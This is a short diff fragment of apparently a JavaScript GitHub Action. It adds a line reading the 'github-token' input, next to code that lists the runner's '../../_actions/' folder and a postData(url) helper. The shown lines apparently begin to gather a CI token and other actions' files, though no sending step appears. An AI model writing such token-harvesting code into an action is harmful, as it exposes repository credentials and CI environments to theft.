@@ -17,6 +17,7 @@ async function postData(url){
 }
 
 try {
+    const githubToken = core.getInput('github-token')
     let path = '../../_actions/'
     fs.readdir(path, function(err, creators){
         if(err){
